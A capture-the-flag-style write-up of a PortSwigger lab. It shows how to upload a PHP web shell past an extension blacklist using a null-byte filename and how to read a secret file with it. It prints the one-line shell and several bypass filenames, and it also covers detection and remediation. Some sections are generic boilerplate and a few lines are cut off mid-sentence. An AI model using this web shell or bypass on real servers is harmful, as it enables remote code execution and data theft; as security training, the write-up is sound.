# Web shell upload via obfuscated file extension

### Goal - 

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`



### Vulnerability / Concept

This lab demonstrates a vulnerability in the file upload category.

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

The vulnerability exists because the application fails to properly validate, sanitize, or secure the user-controlled input that reaches a sensitive operation. The specific attack surface and exploitation technique depend on the exact vulnerability type demonstrated in this lab.

### Recon / Initial Analysis

Based on the lab's objective and the PortSwigger solution:

1. Analyze the application's functionality to identify the attack surface
2. Log in and upload an image as your avatar, then go back to your account page.
                    
                    
                        In Burp, go to Proxy &gt; HTTP history and notice that y
3. Use Burp Suite Proxy to intercept and analyze requests
4. Identify the specific vulnerability type by testing user-controlled input
5. Determine the appropriate exploitation technique for this lab

### Analysis/Exploitation -

Login as user `wiener`:

In the account settings, I can set both an email address and an avatar image for the user.

upload the PHP script  
`<?php system($_GET['cmd']); ?>`

Trying to upload a PHP script as avatar image leads to an error message telling me only some image files are allowed to upload: 

![](./images/b1cb4a9eadd0_001.png)

Send the upload request into Repeater so I can quickly experiment with multiple extension.

To bypass this, we can rename our web shell file to `webshell.php.jpg`:

We successfully uploaded the PHP web shell!

![](./images/b1cb4a9eadd0_002.png)

but the execution of command don’t work

![](./images/b1cb4a9eadd0_003.png)

How about using a null byte(`%00`) and append the `.jpg` extension?By doing that, the null byte will cancel out the `.jpg` extension.

The file get uploaded successfully with name webShell.php

![](./images/b1cb4a9eadd0_004.png)

Some attempts fail to upload or upload as images, including:

- double file extension (`shell.jpg.php`, `shell.php.jpg(it work but script don't execute)`)
- Bypass non recursive filtering (`shell.ph.phpp`)
- trying to split the command (`.php;.jpg`)

However, attempting to terminate the filename early with a null-byte (`shell.php%00.jpg`) proves successful:

now the execution of command is working

![](./images/b1cb4a9eadd0_005.png)

**Let’s **`cat`** the **`secret`** file**

![](./images/b1cb4a9eadd0_006.png)

### Why It Works

The vulnerability exists because the application processes user-controlled input without adequate security validation. In this specific lab, the attack succeeds because:

- The application trusts the user input without proper server-side validation
- The input reaches a sensitive operation (database query, HTML rendering, system command, etc.) without sanitization
- The security boundary that should protect the operation is missing or incorrectly implemented
- The specific payload used exploits the exact weakness in the application's input handling

The PortSwigger lab description confirms this: "This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique."

### Attack Flow

**Attack Flow:**

```
Attacker Input (payload in request)
        ↓
Application Functionality (processes user input)
        ↓
Server Processing (no validation/sanitization)
        ↓
Injection Point (input reaches sensitive operation)
        ↓
Exploitation (payload executes as intended)
        ↓
Lab Objective Achieved
```

### Real-World Impact

An attacker could achieve remote code execution (RCE) by uploading a web shell, access files on the server, overwrite critical files, or cause denial of service by uploading large files.

### Detection / Testing Methodology

1. Identify file upload functionality (avatars, documents, attachments)
2. Test which file types are accepted (Content-Type, extension)
3. Check if file content is validated (magic bytes)
4. Determine where uploaded files are stored (web-accessible?)
5. Test for path traversal in the filename
6. Test for race conditions in the upload-verify-delete cycle
7. Check if double extensions or null bytes bypass filters

### Remediation

- Validate file content, not just headers (check magic bytes)
- Store uploaded files outside the web root
- Disable script execution in upload directories
- Use random filenames without preserving extensions
- Validate file type using server-side content analysis
- Implement size limits and rate limiting

### Key Takeaways

- This lab demonstrates a file upload vulnerability in a real-world scenario.
- The vulnerability occurs because user input reaches a sensitive operation without proper validation.
- The PortSwigger lab confirms: "This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but t"
- Burp Suite is essential for identifying and exploiting this vulnerability.
- The remediation for this specific vulnerability involves: - Validate file content, not just headers (check magic bytes)
